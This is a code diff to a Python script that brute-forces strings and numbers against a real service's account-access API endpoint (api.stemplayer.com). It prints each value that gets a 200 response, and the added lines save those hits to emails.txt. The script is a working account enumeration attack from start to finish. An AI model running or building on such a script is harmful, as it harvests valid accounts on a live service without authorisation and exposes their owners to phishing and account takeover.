@@ -8,6 +8,8 @@ range_list = list(range(0, 16))
 character_list = list(string.ascii_lowercase)
 number_list = list(range(0, 99))
 
+emails = []
+
 def generate(l):
 	for num_item in enumerate(range_list):
 		yield from itertools.product(*([l] * num_item[0]))
@@ -28,9 +30,14 @@ def test(test_email):
 		r = requests.get('https://api.stemplayer.com/accounts/access', headers=headers)
 		if r.status_code == 200:
 			print(email)
+			emails.append(email)
 
 for x in generate("abcdefghijklmnopqrstuvwxyz"):
 		test(''.join(x))
 
 for x in number_list:
 		test(x)
+
+with open('emails.txt', 'w') as f:
+    for item in emails:
+        f.write("%s\n" % item)
